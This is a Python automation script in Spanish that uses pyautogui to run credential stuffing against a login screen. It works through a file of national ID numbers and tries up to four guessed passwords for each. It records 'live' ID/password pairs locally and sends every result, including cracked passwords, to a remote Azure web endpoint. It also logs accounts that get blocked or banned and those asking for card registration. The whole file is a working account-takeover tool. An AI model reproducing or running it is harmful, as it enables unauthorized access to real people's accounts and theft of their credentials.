import pyautogui as p
import time
import requests
import PosiblesPass
from printy import printy

DEATH_1 = "./imagenes/death_1.png"
DEATH_2 = "./imagenes/death_2.png"
VALIDAR_1 = "./imagenes/validar_1.png"  # COntrase;a incorrecta
VALIDAR_2 = './imagenes/validar_2.png' # Usuario bloqueado
BAN = './imagenes/ban.png'
LIVE = './imagenes/live.png'
      
IngresarNumDocumento =  890,386
IngresarNumDocumentoMedio = 771,390

cerrar_apliacion = 1255,986
borrartodo = 1159,111
presionar_aplicacion = 1150,204

def verificarBAN(BAN,bansito):
    bansito = p.locateOnScreen(BAN, grayscale=True, confidence=0.9, region=(686,448,1221,640))
    #print(f"bansito: {bansito}")
    if bansito!=None:
        #input("BAN TEST POR ESO PARADO")
        time.sleep(0.2)
        p.click(1122,585) # click en aceptar
        time.sleep(0.3)
        return True
def verContrasena():
    time.sleep(0.2)
    p.click(1176,360) # clik en el ojito
    
def agregarStatusDB(dni, status):
    api_url = f'https://jackelinos.azurewebsites.net/marcar_estado/'
    try:
        # Construir la URL con los parámetros de consulta
        url = f"{api_url}?dni={dni}&status={status}"
        
        # Enviar la solicitud PUT con los datos en la URL
        resultado = requests.put(url)
        resultado_texto = resultado.text
        
        return resultado_texto
    except Exception as e:
        return f'Error: {str(e)}'

def cerrar_app():
    p.click(cerrar_apliacion)
    time.sleep(0.7)
    p.click(borrartodo)
    time.sleep(0.7)
    p.click(presionar_aplicacion)
    time.sleep(4)

def procesar_lote(dnitxt):
    linealote = 0
    with open(f'./{dnitxt}.txt', 'r') as f:
        lines = f.readlines()

    for line in lines:
        linealote += 1
        PosicionContrasena = 1 # Solo para mover la posicion de la contraseña
        
        print( '\n\n / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / /')

        print(f" - N° {linealote}  |  {line}")
        data = PosiblesPass.procesar_cadena(line) #PRocesando la cadena completa

        print(f' - > {data}')

        elDNI= data[0]
        
        
        time.sleep(0.2) 
        p.doubleClick(IngresarNumDocumentoMedio) # para ingresar el numero del documento
        time.sleep(0.1) # esperar un rato para que no se bugee
        p.typewrite(elDNI, interval=0.02)
        time.sleep(0.2) 

        #Hacer un bucle para que le de en continuar si o si luego
        p.click(944,516)    #Click en continuar
        
        #Verificar 
        rojo =  False
        d1 = None
        v1= None
        v2 = None
        live = None
        bansito = None

        time.sleep(0.5)
        
        while True:
            time.sleep(0.1) # para reducir la velocidad del bucle
            
            #Verificar si es BAN
            if verificarBAN(BAN,bansito):
                printy(f'BAN > > > {elDNI} > > Guardado',"cU")

                banDNI = open("./dataV1.5/banDNI.txt","a")
                banDNI.write(elDNI.rstrip()) # escribir en el block
                banDNI.write("\n")
                banDNI.close()

                api_url = f'https://jackelinos.azurewebsites.net/marcar_no_procesado/{elDNI}'
                requests.put(api_url)
                break
            
            #Acceso contrasena
            rojo = p.pixelMatchesColor(774,250,(236,17,26))
            #print(f"rojo: {rojo}")
    
            if rojo is True:      # Deja poner la contrasena 
                p.click(1011,366) #Click en el lugar del contrasena
                time.sleep(0.1)
                p.typewrite(data[PosicionContrasena], interval=0.02) # escirbir la pass
                #verContrasena()
                time.sleep(0.1)
                p.click(951,565) # click en iniciar sesion
                #Verificar si es valido o no
                while (v1 is None) and (v2 is None):
                    time.sleep(0.1) # para reducir la velocidad del bucle
                    p.moveTo(1012,76)
                    
                    #Verificar si es BAN
                    if verificarBAN(BAN,bansito):
                        print(f'N° {linealote} : BAN > > > {elDNI} > > Guardado')

                        #Guardar en un txt los baneados
                        banDNI = open("./dataV1.5/banDNI.txt","a")
                        banDNI.write(elDNI.rstrip()) # escribir en el block
                        banDNI.write("\n")
                        banDNI.close()

                        api_url = f'https://jackelinos.azurewebsites.net/marcar_no_procesado/{elDNI}'
                        requests.put(api_url)
                        #acá dentro el ban es en pass
                        time.sleep(0.2)
                        p.press('esc') # para salir al menu principal
                        time.sleep(0.3)
                        break
                    
                    v1 = p.locateOnScreen(VALIDAR_1, grayscale=True, confidence=0.9, region=(700,468,1216,626))
                    #print(f"v1: {v1}")
                    if v1!=None: #Documento o contrasena invalida
                        printy(f" - > {data[PosicionContrasena]}  | Documento o contrasena invalida","rI")
                        time.sleep(0.2)
                        p.click(1129,582) # Click en aceptar
                        time.sleep(0.3)
                        
                        if PosicionContrasena < 4: # Por si la contrasena es la 4ta y no esta baneado aun
                            PosicionContrasena += 1
                            
                            p.click(1011,366) #Click en el lugar del contrasena
                            time.sleep(0.3)
                            p.typewrite(data[PosicionContrasena], interval=0.02) # escirbir la pass
                            #verContrasena()
                            time.sleep(0.1)
                            p.click(951,565) # click en iniciar sesion
                            time.sleep(0.3)
                            
                            v1 = None
                            continue
                        
                        time.sleep(0.2)
                        p.press('esc') # para salir al menu principal
                        time.sleep(0.3)
                        
                        contrasenaInvalida = open("./dataV1.5/contrasenaInvalida.txt","a")
                        contrasenaInvalida.write(elDNI.rstrip()) # escribir en el block
                        contrasenaInvalida.write("\n")
                        contrasenaInvalida.close()
                        
                        agregarStatusDB(elDNI,"contrasena invalida")
                        
                        break
                            
                    
                    v2 = p.locateOnScreen(VALIDAR_2, grayscale=True, confidence=0.9, region=(695,419,1213,669))
                    #print(f"v2: {v2}")
                    if v2!=None:
                        print("Usuario bloqueado, Has superado el numero de intentos permitidos")
                        time.sleep(0.2)
                        p.click(1019,620) # Click en cancelar
                        time.sleep(0.2)
                        p.press('esc') # para salir al menu principal
                        time.sleep(0.3)
                        
                        bloqueadostxt = open("./dataV1.5/bloqueados.txt","a")
                        bloqueadostxt.write(elDNI.rstrip()) # escribir en el block
                        bloqueadostxt.write("\n")
                        bloqueadostxt.close()
                        
                        agregarStatusDB(elDNI,"Usuario bloqueado")
                        break
                    
                    #LIVE
                    live = p.locateOnScreen(LIVE, grayscale=True, confidence=0.9, region=(673,130,1229,452))
                    #print(f"live: {live}")
                    if live!=None:
                        printy(f" LIVE - - - >  {elDNI} pass: {data[PosicionContrasena]}","n")
                        time.sleep(0.3)
                        p.click(714,105) # Click para retroceder
                        time.sleep(0.4)
                        p.press('esc') # para salir al menu principal
                        time.sleep(0.4)

                        text = f" Live - - - >  {elDNI} pass: {data[PosicionContrasena]}".rstrip()
                        lives = open("./dataV1.5/lives.txt","a")
                        lives.write(text) # escribir en el block
                        lives.write("\n")
                        lives.close()
                        agregarStatusDB(elDNI,"Live pass: "+data[PosicionContrasena])

                        cerrar_app()
                        
                        time.sleep(0.2)
                        break  
                break

            #DEATH 1 > > > INFORMACION DE LA TARJETA ( PIDE REGISTRAR LA TARJETA )
            d1 = p.locateOnScreen(DEATH_1, grayscale=True, region=(683,48,1233,120))
            #print(f"d1: {d1}")
            if d1!=None:
                #print("INFORMACION DE LA TARJETA ( PIDE REGISTRAR LA TARJETA )")
                printy(f'DEATH > > > {elDNI} > > INFORMACION DE LA TARJETA ( PIDE REGISTRAR LA TARJETA )',"cU")
                agregarStatusDB(elDNI,"PIDE REGISTRAR LA TARJETA")
                
                time.sleep(0.1)
                p.click(712,107) # click en para atras para retroceder
                break
            
            # DEATH 2 > > > No tienes cuenta con nosotros
            d2 = p.locateOnScreen(DEATH_2, grayscale=True, region=(685,502,1242,740)) #grande imagen
            #print(f"d1: {d1}")
            if d2!=None:
                printy(f'DEATH > > > {elDNI} > > > No tienes cuenta con nosotros',"cU")
                agregarStatusDB(elDNI,"No tienes cuenta con nosotros")
                #print("No tienes cuenta con nosotros")
                time.sleep(0.1)
                p.click(988,613) # Click en ahora NO para retroceder
                break
        registro = open("./dataV1.5/registro.txt","w")
        registro.write(elDNI.rstrip()) # escribir en el block
        registro.write("\n")
        registro.close()

if __name__ == "__main__":
    dnitxt = 'dni_v1'
    procesar_lote(dnitxt)
